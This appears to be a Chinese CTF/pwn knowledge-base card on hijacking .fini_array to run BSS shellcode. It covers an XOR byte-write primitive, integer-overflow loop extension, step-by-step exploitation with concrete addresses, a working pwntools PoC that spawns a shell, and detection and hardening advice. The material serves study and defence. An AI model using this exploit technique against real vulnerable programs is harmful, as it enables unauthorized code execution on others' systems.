---
id: binary-pwn-fini-array-hijack-bss-shellcode
title: fini_array 劫持执行 BSS shellcode：XOR 字节任意写 + 整数溢出维持循环，程序退出时夺取控制流
type: scenario
domain: binary
path: binary/pwn
technique: fini-array-hijack-bss-shellcode
aliases:
- fini_array 劫持
- _fini_array 劫持
- 终止函数数组劫持
- XOR 任意字节写
- 整数溢出维持循环
- No RELRO ret2shellcode
tags:
- pwn
- fini-array
- arbitrary-write
- shellcode
- elf
- integer-overflow
- no-relro
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V583
  verified_at: '2026-11-12T12:46:20+08:00'
  notes: 已对照原文核对：图04 checksec No RELRO/No canary/NX disabled/No PIE/RWX、图05 xorByteWithAddress 源码、图08 while(flag<=0)、图06/07 flag 0→0xff000001、图10 fini_array[0]原值0x400610、图13 BSS 0x600c60 shellcode 均与卡一致；三次 XOR 值 0x70/0x0a/0x20 与 0x400610^…=0x600c60 吻合；原文未标组件版本故 affected_versions 省略；dedup 候选 ret2shellcode/格式化字符串 fini_array 非同链。
---

## 一句话结论

当程序提供“按地址 XOR 一个字节”的任意写原语、循环条件是一个可写的 `int` 计数器，且二进制为 No RELRO/No PIE/NX disabled（存在 RWX 段）时，可以先把计数器的符号字节改成 `0xff` 让 `int` 变负从而无限循环，再把 `.fini_array[0]` 改指向 BSS 并逐字节写入 shellcode；循环结束、`main` 返回触发 `.fini_array` 中的终止函数时，程序直接跳转执行 BSS 中的 shellcode。

## 原理

- ELF 启动/退出链：`_start` → `__libc_start_main(main, ..., __libc_csu_init, __libc_csu_fini)`；`main` 返回后，`exit` 会执行 `_fini`/`.fini_array` 中登记的函数（`.fini_array` 是 `.data` 中的函数指针数组，按相反顺序执行）。
- `.fini_array` 在 No RELRO 时位于可写段（此处 0x600970），且 No PIE 时地址固定；把 `[0]` 从原来的 `__do_global_dtors_aux`（0x400610）改成 BSS 中的 shellcode 地址，即可在程序正常退出时劫持控制流。
- 写原语：`xorByteWithAddress(addr, value)` 执行 `*addr ^= value` 并 `++flag`。由于原值已知（BSS 为 0，或先用调试器/readelf 读出目标字节），一次 XOR 就能把字节改成任意值（value = 原值 ^ 目标值）。
- 循环绕过：`while (flag <= 0)`，`flag` 是位于 0x600BCC 的 `int`，初值 0。`int` 最高字节（0x600BCF）改成 0xff 后值为 `0xff000001`（负数），循环永不退出，从而获得任意多次单字节 XOR 写；最后再把该字节 XOR 回正，循环结束并走退出流程。
- 执行 shellcode：BSS（0x600c60）在 RWX 段（checksec 显示 RWX segments），逐字节写入 `shellcraft.sh()` 后无需 mprotect；把 `.fini_array[0]` 指向它即可。

## 触发条件

- 存在按地址写单字节/字/双字的原语，且地址与值均可控（XOR 型原语需已知原值或可反复调用）。
- 循环/计数器是可写的已知地址变量，可被改成负数/绕过退出条件（或程序本身循环次数足够）。
- `.fini_array` 可写：No RELRO/Partial RELRO 且未被映射为只读；No PIE 或已知基址。
- 可执行 shellcode：NX disabled 或存在 RWX 段（或先用 mprotect 改权限，见关联卡）。
- 程序会正常返回/调用 exit 以触发 `.fini_array`。

## 利用步骤

1. `checksec` 确认：No RELRO、No canary、NX disabled、No PIE、RWX segments；`readelf -S`/`elfheader` 定位 `.fini_array`（示例 0x600970）与 `.bss`（0x600c60）。
2. 定位循环计数器 `flag`（示例 0x600BCC）及其最高字节地址 0x600BCF；用 `tele`/`x` 确认初值与 `.fini_array[0]` 原值（示例 0x400610）。
3. 写 `0xff` 到 0x600BCF，把 `flag` 变成 0xff000001（负数），循环不再退出。
4. 计算目标指针各字节的 XOR 值（原值 ^ 目标值），把 `.fini_array[0]` 改成 BSS 地址 0x600c60。
5. 在 BSS 处逐字节 XOR 写入 shellcode（BSS 原值为 0，直接写目标字节即可）。
6. 把 0x600BCF 再 XOR 一次 0xff 使 flag 变正，循环退出；`main` 返回 → `exit` → `.fini_array[0]` → shellcode 执行，拿到 shell。

## PoC

```python
def write_value(addr, value):
    p.sendlineafter(b"addr: ", addr)
    p.sendlineafter(b"value: ", value)

# flag: int at 0x600BCC, highest byte 0x600BCF; set 0xff -> 0xff000001 (negative)
write_value(b"0x600bcf", b"0xff")

# .fini_array[0] at 0x600970: XOR bytes to point to BSS shellcode 0x600c60
write_value(b"0x600970", b"0x70")
write_value(b"0x600971", b"0x0a")
write_value(b"0x600972", b"0x20")

# write shellcode to BSS (RWX) byte by byte
shellcode = asm(shellcraft.sh())
for i in range(len(shellcode)):
    write_value(hex(0x600c60 + i), hex(shellcode[i]))

# make flag positive again -> loop exits -> exit -> .fini_array -> shellcode
write_value(b"0x600bcf", b"0xff")
p.interactive()
```

## 变体与关联

- 变体：若只能写指针/qword（不能写 shellcode），把 `.fini_array[0]` 指向 one-gadget、`system`/`execve` 相关函数或已有的 `backdoor` 函数。
- 变体：Partial RELRO 但 `.fini_array` 所在段可写；Full RELRO 会把 `.fini_array` 放进只读 RELRO 段，不可用。
- 变体：用格式化字符串（见关联卡）或堆漏洞获得对 `.fini_array` 的写；静态二进制中 `.fini_array` 的执行顺序与循环技巧见 fini_array 循环卡。
- 关联：[[binary-pwn-format-string-non-stack-fini-array-loop-write]]（格式化字符串改写 fini_array 重启 main）、[[binary-pwn-format-string-single-shot-fini-array-restart-got-system-plt]]（单次格式化字符串双写 fini_array 与 GOT）、[[binary-pwn-stack-ret2shellcode-mprotect-bss-rwx-page]]（BSS RWX/ mprotect 后执行 shellcode）、[[binary-pwn-fini-array-loop-leave-ret-pivot-rop]]（同篇的 fini_array 循环 + leave_ret ROP 变体）。
- 边界：Full RELRO（`.fini_array` 只读）、PIE+未知基址、NX 且无 RWX/mprotect 原语、循环无法绕过、程序 `_exit` 不执行 fini_array 时失效。

## 检测与防御

- 检测：运行期对 `.fini_array`/`.init_array` 所在页的写操作（mprotect/audit）；进程退出前出现异常跳转到 `.bss`/`.data` 地址；checksec 基线发现 No RELRO。
- 防御：编译时使用 Full RELRO（`-Wl,-z,relro,-z,now`）、PIE、`-z noexecstack` 与 NX；避免 RWX 段；开启 stack canary；把循环/状态变量放在只读或受保护区域；对 ELF 控制流表（`.fini_array`/`.init_array`/GOT）做完整性监控。
